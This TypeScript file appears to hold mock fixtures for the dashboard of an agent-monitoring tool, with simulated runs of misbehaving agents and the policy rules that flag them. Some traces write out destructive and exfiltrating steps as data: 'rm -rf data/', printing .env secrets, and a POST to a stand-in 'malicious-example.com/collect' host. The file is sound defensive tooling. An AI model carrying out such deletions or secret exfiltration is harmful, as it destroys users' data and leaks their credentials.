import type {
  DashboardRunExport,
  RunSummary,
  PolicyRule,
  RuntimeInfo,
  TraceEvent,
} from './contracts';

// ─── Helpers ────────────────────────────────────────────────

function makeEvent(overrides: Partial<TraceEvent>): TraceEvent {
  return {
    id: `evt_${String(Math.floor(Math.random() * 10000)).padStart(4, '0')}`,
    type: 'shell',
    seq: 1,
    ts: '2026-06-17T10:00:00Z',
    ...overrides,
  };
}

// ─── Fixture: delete demo ───────────────────────────────────

export const deleteRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-delete-001',
  command: 'traceseal run python examples/bad_agent_delete.py',
  started_at: '2026-06-17T10:00:00Z',
  finished_at: '2026-06-17T10:00:15Z',
  status: 'failed',
  exit_code: 1,
  event_count: 4,
  high_risk_count: 1,
  first_harmful_event: makeEvent({
    id: 'evt_0002',
    seq: 2,
    ts: '2026-06-17T10:00:02Z',
    type: 'shell',
    operation: 'subprocess.run',
    input: { command: 'rm -rf data/' },
    output: { status: 'ok', returncode: 0 },
    risk: {
      level: 'critical',
      reasons: ['recursive force delete', 'deleted protected path: data/'],
      policy_rule: 'dangerous_delete',
      action: 'warn',
    },
    file_changes: [
      { path: 'data/', change_type: 'deleted' },
      { path: 'data/important.txt', change_type: 'deleted' },
    ],
  }),
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T10:00:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: 'data/important.txt' },
      output: { status: 'ok', bytes_written: 42 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T10:00:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'rm -rf data/' },
      output: { status: 'ok', returncode: 0 },
      risk: {
        level: 'critical',
        reasons: ['recursive force delete', 'deleted protected path: data/'],
        policy_rule: 'dangerous_delete',
        action: 'warn',
      },
      file_changes: [
        { path: 'data/', change_type: 'deleted' },
        { path: 'data/important.txt', change_type: 'deleted' },
      ],
    }),
    makeEvent({
      id: 'evt_0003', seq: 3, ts: '2026-06-17T10:00:03Z',
      type: 'file.delete', operation: 'shutil.rmtree',
      input: { path: 'data/important.txt' },
      output: { status: 'ok' },
      risk: { level: 'high', reasons: ['file deleted'] },
      file_changes: [{ path: 'data/important.txt', change_type: 'deleted' }],
    }),
    makeEvent({
      id: 'evt_0004', seq: 4, ts: '2026-06-17T10:00:04Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'pytest' },
      output: { status: 'failed', returncode: 1, stderr: 'FileNotFoundError: data/important.txt not found' },
    }),
  ],
  affected_files: ['data/', 'data/important.txt'],
  suggested_policy: 'deny shell "rm -rf data/**"',
};

// ─── Fixture: env write demo ────────────────────────────────

export const envRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-env-001',
  command: 'traceseal run python examples/bad_agent_env.py',
  started_at: '2026-06-17T10:05:00Z',
  finished_at: '2026-06-17T10:05:10Z',
  status: 'completed',
  exit_code: 0,
  event_count: 3,
  high_risk_count: 2,
  first_harmful_event: makeEvent({
    id: 'evt_0001', seq: 1, ts: '2026-06-17T10:05:01Z',
    type: 'file.write', operation: 'file.write',
    input: { path: '.env' },
    output: { status: 'ok', bytes_written: 128 },
    risk: {
      level: 'high',
      reasons: ['writing to protected path: .env'],
      policy_rule: 'env_write',
      action: 'warn',
    },
    file_changes: [{ path: '.env', change_type: 'created' }],
  }),
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T10:05:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: '.env' },
      output: { status: 'ok', bytes_written: 128 },
      risk: {
        level: 'high',
        reasons: ['writing to protected path: .env'],
        policy_rule: 'env_write',
        action: 'warn',
      },
      file_changes: [{ path: '.env', change_type: 'created' }],
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T10:05:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'print .env content' },
      output: { status: 'ok', stdout: 'OPENAI_API_KEY=sk-demo-secret\nDATABASE_URL=postgres://demo:demo@localhost/demo' },
      risk: { level: 'high', reasons: ['sensitive data printed to stdout'] },
    }),
    makeEvent({
      id: 'evt_0003', seq: 3, ts: '2026-06-17T10:05:03Z',
      type: 'http', operation: 'requests.post',
      input: { method: 'POST', url: 'https://httpbin.org/post' },
      output: { status: 'ok', status_code: 200 },
      risk: {
        level: 'high',
        reasons: ['HTTP POST to non-whitelisted domain: httpbin.org'],
        policy_rule: 'suspicious_http_post',
        action: 'warn',
      },
    }),
  ],
  affected_files: ['.env'],
  suggested_policy: 'deny file.write ".env"\ndeny file.write ".env.*"\ndeny http "POST *://httpbin.org/*"',
};

// ─── Fixture: git push demo ─────────────────────────────────

export const gitRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-git-001',
  command: 'traceseal run python examples/bad_agent_git.py',
  started_at: '2026-06-17T10:10:00Z',
  finished_at: '2026-06-17T10:10:12Z',
  status: 'completed',
  exit_code: 0,
  event_count: 5,
  high_risk_count: 1,
  first_harmful_event: makeEvent({
    id: 'evt_0005', seq: 5, ts: '2026-06-17T10:10:05Z',
    type: 'shell', operation: 'subprocess.run',
    input: { command: 'git push origin main' },
    output: { status: 'ok', returncode: 0 },
    risk: {
      level: 'high',
      reasons: ['git push detected', 'pushing unverified changes to remote'],
      policy_rule: 'git_push',
      action: 'warn',
    },
  }),
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T10:10:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: 'src/main.py' },
      output: { status: 'ok', bytes_written: 256 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T10:10:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'python -m pytest tests/' },
      output: { status: 'ok', returncode: 0 },
    }),
    makeEvent({
      id: 'evt_0003', seq: 3, ts: '2026-06-17T10:10:03Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'git add .' },
      output: { status: 'ok', returncode: 0 },
    }),
    makeEvent({
      id: 'evt_0004', seq: 4, ts: '2026-06-17T10:10:04Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'git commit -m "fix: add null pointer check"' },
      output: { status: 'ok', returncode: 0 },
    }),
    makeEvent({
      id: 'evt_0005', seq: 5, ts: '2026-06-17T10:10:05Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'git push origin main' },
      output: { status: 'ok', returncode: 0 },
      risk: {
        level: 'high',
        reasons: ['git push detected', 'pushing unverified changes to remote'],
        policy_rule: 'git_push',
        action: 'warn',
      },
    }),
  ],
  affected_files: ['src/main.py'],
  suggested_policy: 'deny shell "git push*"\n# or\nrequire_approval shell "git push*"',
};

// ─── Fixture: HTTP POST demo ────────────────────────────────

export const httpRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-http-001',
  command: 'traceseal run python examples/bad_agent_http.py',
  started_at: '2026-06-17T10:15:00Z',
  finished_at: '2026-06-17T10:15:08Z',
  status: 'completed',
  exit_code: 0,
  event_count: 3,
  high_risk_count: 2,
  first_harmful_event: makeEvent({
    id: 'evt_0002', seq: 2, ts: '2026-06-17T10:15:02Z',
    type: 'file.write', operation: 'file.write',
    input: { path: '.env' },
    output: { status: 'ok', bytes_written: 64 },
    risk: {
      level: 'high',
      reasons: ['writing to protected path: .env'],
      policy_rule: 'env_write',
      action: 'warn',
    },
  }),
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T10:15:01Z',
      type: 'http', operation: 'requests.get',
      input: { method: 'GET', url: 'https://api.github.com/repos/myorg/myproject' },
      output: { status: 'ok', status_code: 200 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T10:15:02Z',
      type: 'file.write', operation: 'file.write',
      input: { path: '.env' },
      output: { status: 'ok', bytes_written: 64 },
      risk: {
        level: 'high',
        reasons: ['writing to protected path: .env'],
        policy_rule: 'env_write',
        action: 'warn',
      },
    }),
    makeEvent({
      id: 'evt_0003', seq: 3, ts: '2026-06-17T10:15:03Z',
      type: 'http', operation: 'requests.post',
      input: { method: 'POST', url: 'https://malicious-example.com/collect' },
      output: { status: 'ok', status_code: 200 },
      risk: {
        level: 'high',
        reasons: ['HTTP POST to non-whitelisted domain', 'potential data exfiltration'],
        policy_rule: 'suspicious_http_post',
        action: 'warn',
      },
    }),
  ],
  affected_files: ['.env'],
  suggested_policy: 'deny file.write ".env"\ndeny http "POST *://malicious-example.com/*"',
};

// ─── Fixture: clean run (no risk) ───────────────────────────

export const cleanRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-clean-001',
  command: 'traceseal run python tests/test_mvp.py',
  started_at: '2026-06-17T09:00:00Z',
  finished_at: '2026-06-17T09:00:05Z',
  status: 'completed',
  exit_code: 0,
  event_count: 2,
  high_risk_count: 0,
  first_harmful_event: null,
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T09:00:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: 'src/main.py' },
      output: { status: 'ok', bytes_written: 128 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T09:00:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'pytest' },
      output: { status: 'ok', returncode: 0 },
    }),
  ],
  affected_files: [],
  suggested_policy: null,
};

// ─── Fixture: failed run ────────────────────────────────────

export const failedRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-failed-001',
  command: 'traceseal run python tests/test_broken.py',
  started_at: '2026-06-17T09:30:00Z',
  finished_at: '2026-06-17T09:30:03Z',
  status: 'failed',
  exit_code: 1,
  event_count: 3,
  high_risk_count: 0,
  first_harmful_event: null,
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T09:30:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: 'src/broken.py' },
      output: { status: 'ok', bytes_written: 64 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T09:30:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'python src/broken.py' },
      output: { status: 'failed', returncode: 1, stderr: 'SyntaxError: invalid syntax' },
    }),
    makeEvent({
      id: 'evt_0003', seq: 3, ts: '2026-06-17T09:30:03Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'pytest' },
      output: { status: 'failed', returncode: 1, stderr: 'ImportError: No module named broken' },
    }),
  ],
  affected_files: [],
  suggested_policy: null,
};

// ─── Fixture: blocked run ───────────────────────────────────

export const blockedRun: DashboardRunExport = {
  schema_version: 1,
  run_id: 'run-blocked-001',
  command: 'TRACESEAL_POLICY_MODE=block traceseal run python examples/bad_agent_delete.py',
  started_at: '2026-06-17T11:00:00Z',
  finished_at: '2026-06-17T11:00:02Z',
  status: 'blocked',
  exit_code: 1,
  event_count: 2,
  high_risk_count: 1,
  first_harmful_event: makeEvent({
    id: 'evt_0002', seq: 2, ts: '2026-06-17T11:00:02Z',
    type: 'shell', operation: 'subprocess.run',
    input: { command: 'rm -rf data/' },
    output: { status: 'blocked' },
    risk: {
      level: 'critical',
      reasons: ['operation blocked by policy'],
      policy_rule: 'dangerous_delete',
      action: 'block',
    },
  }),
  events: [
    makeEvent({
      id: 'evt_0001', seq: 1, ts: '2026-06-17T11:00:01Z',
      type: 'file.write', operation: 'file.write',
      input: { path: 'data/important.txt' },
      output: { status: 'ok', bytes_written: 42 },
    }),
    makeEvent({
      id: 'evt_0002', seq: 2, ts: '2026-06-17T11:00:02Z',
      type: 'shell', operation: 'subprocess.run',
      input: { command: 'rm -rf data/' },
      output: { status: 'blocked' },
      risk: {
        level: 'critical',
        reasons: ['operation blocked by policy'],
        policy_rule: 'dangerous_delete',
        action: 'block',
      },
    }),
  ],
  affected_files: [],
  suggested_policy: 'deny shell "rm -rf data/**"',
};

// ─── Run summaries ──────────────────────────────────────────

export const runSummaries: RunSummary[] = [
  {
    run_id: 'run-delete-001',
    command: 'traceseal run python examples/bad_agent_delete.py',
    started_at: '2026-06-17T10:00:00Z',
    finished_at: '2026-06-17T10:00:15Z',
    status: 'failed',
    exit_code: 1,
    event_count: 4,
    high_risk_count: 1,
    first_harmful_event_id: 'evt_0002',
  },
  {
    run_id: 'run-env-001',
    command: 'traceseal run python examples/bad_agent_env.py',
    started_at: '2026-06-17T10:05:00Z',
    finished_at: '2026-06-17T10:05:10Z',
    status: 'completed',
    exit_code: 0,
    event_count: 3,
    high_risk_count: 2,
    first_harmful_event_id: 'evt_0001',
  },
  {
    run_id: 'run-git-001',
    command: 'traceseal run python examples/bad_agent_git.py',
    started_at: '2026-06-17T10:10:00Z',
    finished_at: '2026-06-17T10:10:12Z',
    status: 'completed',
    exit_code: 0,
    event_count: 5,
    high_risk_count: 1,
    first_harmful_event_id: 'evt_0005',
  },
  {
    run_id: 'run-http-001',
    command: 'traceseal run python examples/bad_agent_http.py',
    started_at: '2026-06-17T10:15:00Z',
    finished_at: '2026-06-17T10:15:08Z',
    status: 'completed',
    exit_code: 0,
    event_count: 3,
    high_risk_count: 2,
    first_harmful_event_id: 'evt_0002',
  },
  {
    run_id: 'run-clean-001',
    command: 'traceseal run python tests/test_mvp.py',
    started_at: '2026-06-17T09:00:00Z',
    finished_at: '2026-06-17T09:00:05Z',
    status: 'completed',
    exit_code: 0,
    event_count: 2,
    high_risk_count: 0,
    first_harmful_event_id: null,
  },
  {
    run_id: 'run-failed-001',
    command: 'traceseal run python tests/test_broken.py',
    started_at: '2026-06-17T09:30:00Z',
    finished_at: '2026-06-17T09:30:03Z',
    status: 'failed',
    exit_code: 1,
    event_count: 3,
    high_risk_count: 0,
    first_harmful_event_id: null,
  },
  {
    run_id: 'run-blocked-001',
    command: 'TRACESEAL_POLICY_MODE=block traceseal run python examples/bad_agent_delete.py',
    started_at: '2026-06-17T11:00:00Z',
    finished_at: '2026-06-17T11:00:02Z',
    status: 'blocked',
    exit_code: 1,
    event_count: 2,
    high_risk_count: 1,
    first_harmful_event_id: 'evt_0002',
  },
];

// ─── Policy rules ───────────────────────────────────────────

export const policyRules: PolicyRule[] = [
  {
    rule_id: 'dangerous_delete',
    event_type: 'shell',
    pattern: 'rm -rf or rmdir /s /q',
    risk_level: 'critical',
    action: 'warn',
    description: 'Mark recursive force delete operations as critical risk',
    suggested_policy: 'deny shell "rm -rf data/**"',
  },
  {
    rule_id: 'env_write',
    event_type: 'file.write',
    pattern: '.env or .env.*',
    risk_level: 'high',
    action: 'warn',
    description: 'Mark writing to .env files as high risk',
    suggested_policy: 'deny file.write ".env"\ndeny file.write ".env.*"',
  },
  {
    rule_id: 'git_push',
    event_type: 'shell',
    pattern: 'git push',
    risk_level: 'high',
    action: 'warn',
    description: 'Mark git push operations as high risk',
    suggested_policy: 'deny shell "git push*"\n# or\nrequire_approval shell "git push*"',
  },
  {
    rule_id: 'suspicious_http_post',
    event_type: 'http',
    pattern: 'POST or PUT to non-whitelisted domain',
    risk_level: 'high',
    action: 'warn',
    description: 'Mark HTTP POST/PUT to non-whitelisted domains as high risk',
    suggested_policy: 'deny http "POST *://malicious-example.com/*"',
  },
];

// ─── Runtime info ───────────────────────────────────────────

export const runtimeInfo: RuntimeInfo = {
  pythonCommand: 'python',
  repositoryRoot: '/home/user/trace-seal',
  platform: 'win32',
  version: '0.2.0-dev',
};